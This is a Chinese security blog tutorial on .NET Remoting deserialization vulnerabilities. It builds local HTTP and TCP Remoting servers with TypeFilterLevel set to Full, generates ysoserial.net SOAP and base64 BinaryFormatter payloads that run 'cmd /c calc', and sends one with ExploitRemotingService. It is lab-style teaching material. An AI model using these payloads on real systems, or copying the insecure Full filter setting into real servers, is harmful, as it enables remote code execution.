# Dot NET-.NET Remoting反序列化漏洞

  
  
&lt;!--more--&gt;  
## .NET Remoting基础  
.NET Remoting是一个分布式应用解决方案，它允许不同`AppDomain(应用程序域)`之间进行通信，这里的通信可以是在同一个进程中进行或者一个系统中的不同进程间进行的通信。.NET Remoting框架也提供了多种服务，包括激活和生存期支持，以及负责与远程应用程序进行消息传输的通道。应用程序可在重视性能的场景下使用二进制数据传输，在需要与其他远程处理框架进行交互的场景下使用 XML 数据传输。在从一个AppDomain向另一个AppDomain传输消息时，所有的XML数据都使用 SOAP 协议。  
## .NET Remoting信道和协议  
信道是Server和Client进行通信的，在.NET Remoting中提供了三种信道类型。  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506051133352.png)
其中不同协议用处不同  
- IpcChannel用于本机之间进程传输，使用IPC协议传输比HTTP、TCP速度要快，但是只能在本机传输，不能跨机器。  
- TcpChannel基于TCP传输，将对象进行二进制序列化之后传输二进制数据流，比http传输效率更高。  
- HttpChannel基于HTTP传输，将对象进行soap序列化之后在网络中传输xml，兼容性更强。  
## .NET Remoting Demo  
以`HttpChannel`为例，  

- RemoteDemoClient  
- RemoteDemoServer  
- RemoteObject  

分别表示客户端、服务端和要传输的对象。  
### 传输对象类  
RemoteDemoObject.RemoteDemoObjectClass需要继承`MarshalByRefObject`类才能跨域(AppDomain)远程传输。  
```c#  
using System;  
  
namespace RemoteDemoObject  
{  
    public class RemoteDemoObjectClass:MarshalByRefObject  
    {  
        public int count = 0;  
        public int GetCount()  
        {  
            Console.WriteLine(&#34;GetCount called.&#34;);  
            return count&#43;&#43;;  
        }  
    }  
}  
```  
### 服务端  
服务端注册HttpServerChannel并绑定在9999端口，然后`RemotingConfiguration.RegisterWellKnownServiceType`发布uri地址为`RemoteObjectClass.rem`的远程调用对象，类型是`RemoteDemoObjectClass`  
```c#  
using System;  
using System.Runtime.Remoting;  
using System.Runtime.Remoting.Channels;  
using System.Runtime.Remoting.Channels.Http;  
using RemoteDemoObject;  
  
namespace RemoteDemoServer  
{  
    class Program  
    {   
        static void Main(string[] args)  
        {  
            HttpServerChannel httpServerChannel = new HttpServerChannel(9999);  
            ChannelServices.RegisterChannel(httpServerChannel, false);  
            RemotingConfiguration.RegisterWellKnownServiceType(typeof(RemoteDemoObjectClass), &#34;RemoteDemoObjectClass.rem&#34;, WellKnownObjectMode.Singleton);  
            Console.WriteLine(&#34;server has been start&#34;);  
            Console.ReadKey();  
        }  
    }  
}  
```  
### 客户端  
```c#  
using System;  
using System.Collections.Generic;  
using System.Linq;  
using System.Text;  
using System.Threading.Tasks;  
using RemoteDemoObject;  
  
namespace RemoteDemoClient  
{  
    class Program  
    {  
        static void Main(string[] args)  
        {  
             string serverAddress = &#34;http://localhost:9999/RemoteDemoObjectClass.rem&#34;;  
             RemoteDemoObjectClass obj1 = (RemoteDemoObjectClass)Activator.GetObject(typeof(RemoteDemoObjectClass), serverAddress);  
  
            Console.WriteLine(&#34;call GetCount() get return value:{0}&#34;,obj1.GetCount());  
            Console.ReadKey();  
        }  
    }  
}  
```  
客户端通过`Activator.GetObject`拿到远程对象并返回一个实例。  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506060057395.png)
可以看到`value`会进行自增。  
### HttpServerChannel数据包  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506061123523.png)
在`HttpServerChannel`采用soap协议传输对象，  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506060130780.png)
跟进`this.SetupChannel()`进行查看一下  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506060131093.png)
判断了自身`_sinkProvider`是否为空，如果是空则会进入`CreateDefaultServerProviderChain()`  
这里使用了`Provider`链，从`SdlChannelSinkProvider-&gt;SoapServerFormatterSinkProvider-&gt;BinaryServerFormatterSinkProvider`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506060131397.png)
其中  
`SdlChannelSinkProvider`当访问`?wsdl`才会触发返回说明文档，然后会进行`SoapServerFormatterSinkProvider`，如果`SoapServerFormatterSinkProvider`处理不了，会继续`BinaryServerFormatterSinkProvider`处理。  
### 漏洞是如何产生的？  
在`SoapServerFormatterSinkProvider和BinaryServerFormatterSinkProvider`这两个类中，都有一个属性`TypeFilterLevel`  
https://learn.microsoft.com/zh-cn/dotnet/api/system.runtime.serialization.formatters.typefilterlevel?view=net-5.0  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506060137943.png)
由文档可知，这个属性决定了是否完全反序列化。  
### 攻击HttpServerChannel  
Demo，将`TypeFilterLevel`属性设置为`Full`  
```c#  
using System;  
using System.Collections;  
using System.Runtime.Remoting;  
using System.Runtime.Remoting.Channels;  
using System.Runtime.Remoting.Channels.Http;  
using System.Runtime.Serialization.Formatters;  
using RemoteDemoObject;  
  
namespace RemoteDemoServer  
{  
    class Program  
    {  
        static void Main(string[] args)  
        {  
            SoapServerFormatterSinkProvider soapServerFormatterSinkProvider = new SoapServerFormatterSinkProvider()  
            {  
                TypeFilterLevel = TypeFilterLevel.Full  
            };  
  
            IDictionary hashtables = new Hashtable();  
            hashtables[&#34;port&#34;] = 9999;  
  
            HttpServerChannel httpServerChannel = new HttpServerChannel(hashtables,soapServerFormatterSinkProvider);  
            ChannelServices.RegisterChannel(httpServerChannel, false);  
            RemotingConfiguration.RegisterWellKnownServiceType(typeof(RemoteDemoObjectClass), &#34;RemoteDemoObjectClass.rem&#34;, WellKnownObjectMode.Singleton);  
  
            Console.WriteLine(&#34;server has been start&#34;);  
            Console.ReadKey();  
        }  
    }  
}  
```  
生成`payload`  
```powershell  
C:\Users\nlrvana\Desktop\ysoserial.net-master\ysoserial\bin\Release&gt;ysoserial.exe -f soapformatter -g TextFormattingRunProperties -c calc  
&lt;SOAP-ENV:Envelope xmlns:xsi=&#34;http://www.w3.org/2001/XMLSchema-instance&#34; xmlns:xsd=&#34;http://www.w3.org/2001/XMLSchema&#34; xmlns:SOAP-ENC=&#34;http://schemas.xmlsoap.org/soap/encoding/&#34; xmlns:SOAP-ENV=&#34;http://schemas.xmlsoap.org/soap/envelope/&#34; xmlns:clr=&#34;http://schemas.microsoft.com/soap/encoding/clr/1.0&#34; SOAP-ENV:encodingStyle=&#34;http://schemas.xmlsoap.org/soap/encoding/&#34;&gt;  
&lt;SOAP-ENV:Body&gt;  
&lt;a1:TextFormattingRunProperties id=&#34;ref-1&#34; xmlns:a1=&#34;http://schemas.microsoft.com/clr/nsassem/Microsoft.VisualStudio.Text.Formatting/Microsoft.PowerShell.Editor%2C%20Version%3D3.0.0.0%2C%20Culture%3Dneutral%2C%20PublicKeyToken%3D31bf3856ad364e35&#34;&gt;  
&lt;ForegroundBrush id=&#34;ref-3&#34;&gt;&amp;#60;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;utf-16&amp;#34;?&amp;#62;  
&amp;#60;ObjectDataProvider MethodName=&amp;#34;Start&amp;#34; IsInitialLoadEnabled=&amp;#34;False&amp;#34; xmlns=&amp;#34;http://schemas.microsoft.com/winfx/2006/xaml/presentation&amp;#34; xmlns:sd=&amp;#34;clr-namespace:System.Diagnostics;assembly=System&amp;#34; xmlns:x=&amp;#34;http://schemas.microsoft.com/winfx/2006/xaml&amp;#34;&amp;#62;  
  &amp;#60;ObjectDataProvider.ObjectInstance&amp;#62;  
    &amp;#60;sd:Process&amp;#62;  
      &amp;#60;sd:Process.StartInfo&amp;#62;  
        &amp;#60;sd:ProcessStartInfo Arguments=&amp;#34;/c calc&amp;#34; StandardErrorEncoding=&amp;#34;{x:Null}&amp;#34; StandardOutputEncoding=&amp;#34;{x:Null}&amp;#34; UserName=&amp;#34;&amp;#34; Password=&amp;#34;{x:Null}&amp;#34; Domain=&amp;#34;&amp;#34; LoadUserProfile=&amp;#34;False&amp;#34; FileName=&amp;#34;cmd&amp;#34; /&amp;#62;  
      &amp;#60;/sd:Process.StartInfo&amp;#62;  
    &amp;#60;/sd:Process&amp;#62;  
  &amp;#60;/ObjectDataProvider.ObjectInstance&amp;#62;  
&amp;#60;/ObjectDataProvider&amp;#62;&lt;/ForegroundBrush&gt;  
&lt;/a1:TextFormattingRunProperties&gt;  
&lt;/SOAP-ENV:Body&gt;  
&lt;/SOAP-ENV:Envelope&gt;  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506061129886.png)
### TCPServerChannel  
需要修改服务端  
```c#  
using System;  
using System.Collections;  
using System.Runtime.Remoting;  
using System.Runtime.Remoting.Channels;  
using System.Runtime.Remoting.Channels.Tcp;  
using System.Runtime.Serialization.Formatters;  
using RemoteDemoObject;  
  
namespace RemoteDemoServer  
{  
    class Program  
    {  
        static void Main(string[] args)  
        {  
            BinaryServerFormatterSinkProvider binary = new BinaryServerFormatterSinkProvider()  
            {  
                TypeFilterLevel = TypeFilterLevel.Full  
            };  
  
            IDictionary hashtables = new Hashtable();  
            hashtables[&#34;port&#34;] = 9999;  
  
            TcpServerChannel httpServerChannel = new TcpServerChannel(hashtables,binary);  
            ChannelServices.RegisterChannel(httpServerChannel, false);  
            RemotingConfiguration.RegisterWellKnownServiceType(typeof(RemoteDemoObjectClass), &#34;RemoteDemoObjectClass.rem&#34;, WellKnownObjectMode.Singleton);  
  
            Console.WriteLine(&#34;server has been start&#34;);  
            Console.ReadKey();  
        }  
    }  
}  
```  
利用`wireshark`监听一下  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506061217773.png)
`2e 4e 45 54`是`.NET`开头进行二进制传输远程调用方法、类型和命名空间。  
### 攻击TcpServerChannel  
GitHub  
https://github.com/tyranid/ExploitRemotingService  
通过这个攻击，可以攻击`TcpServerChannel`  
```powershell  
C:\Users\nlrvana\Desktop\ysoserial.net-master\ysoserial\bin\Release&gt;ysoserial.exe -f binaryformatter -g TextFormattingRunProperties -c calc -o base64  
AAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAQAAAA9Gb3JlZ3JvdW5kQnJ1c2gBAgAAAAYDAAAAswU8P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJ1dGYtMTYiPz4NCjxPYmplY3REYXRhUHJvdmlkZXIgTWV0aG9kTmFtZT0iU3RhcnQiIElzSW5pdGlhbExvYWRFbmFibGVkPSJGYWxzZSIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiIgeG1sbnM6c2Q9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PVN5c3RlbSIgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiPg0KICA8T2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KICAgIDxzZDpQcm9jZXNzPg0KICAgICAgPHNkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgICAgICA8c2Q6UHJvY2Vzc1N0YXJ0SW5mbyBBcmd1bWVudHM9Ii9jIGNhbGMiIFN0YW5kYXJkRXJyb3JFbmNvZGluZz0ie3g6TnVsbH0iIFN0YW5kYXJkT3V0cHV0RW5jb2Rpbmc9Int4Ok51bGx9IiBVc2VyTmFtZT0iIiBQYXNzd29yZD0ie3g6TnVsbH0iIERvbWFpbj0iIiBMb2FkVXNlclByb2ZpbGU9IkZhbHNlIiBGaWxlTmFtZT0iY21kIiAvPg0KICAgICAgPC9zZDpQcm9jZXNzLlN0YXJ0SW5mbz4NCiAgICA8L3NkOlByb2Nlc3M&#43;DQogIDwvT2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KPC9PYmplY3REYXRhUHJvdmlkZXI&#43;Cw==  
  
C:\Users\nlrvana\Desktop\ExploitRemotingService-master\ExploitRemotingService-master\ExploitRemotingService\bin\Debug&gt;ExploitRemotingService.exe tcp://localhost:9999/RemoteDemoObjectClass.rem raw AAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAQAAAA9Gb3JlZ3JvdW5kQnJ1c2gBAgAAAAYDAAAAswU8P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJ1dGYtMTYiPz4NCjxPYmplY3REYXRhUHJvdmlkZXIgTWV0aG9kTmFtZT0iU3RhcnQiIElzSW5pdGlhbExvYWRFbmFibGVkPSJGYWxzZSIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiIgeG1sbnM6c2Q9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PVN5c3RlbSIgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiPg0KICA8T2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KICAgIDxzZDpQcm9jZXNzPg0KICAgICAgPHNkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgICAgICA8c2Q6UHJvY2Vzc1N0YXJ0SW5mbyBBcmd1bWVudHM9Ii9jIGNhbGMiIFN0YW5kYXJkRXJyb3JFbmNvZGluZz0ie3g6TnVsbH0iIFN0YW5kYXJkT3V0cHV0RW5jb2Rpbmc9Int4Ok51bGx9IiBVc2VyTmFtZT0iIiBQYXNzd29yZD0ie3g6TnVsbH0iIERvbWFpbj0iIiBMb2FkVXNlclByb2ZpbGU9IkZhbHNlIiBGaWxlTmFtZT0iY21kIiAvPg0KICAgICAgPC9zZDpQcm9jZXNzLlN0YXJ0SW5mbz4NCiAgICA8L3NkOlByb2Nlc3M&#43;DQogIDwvT2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KPC9PYmplY3REYXRhUHJvdmlkZXI&#43;Cw==  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506061704008.png)
  

---

> Author: N1Rvana  
> URL: http://localhost:1313/dot-net-.net-remoting%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/  

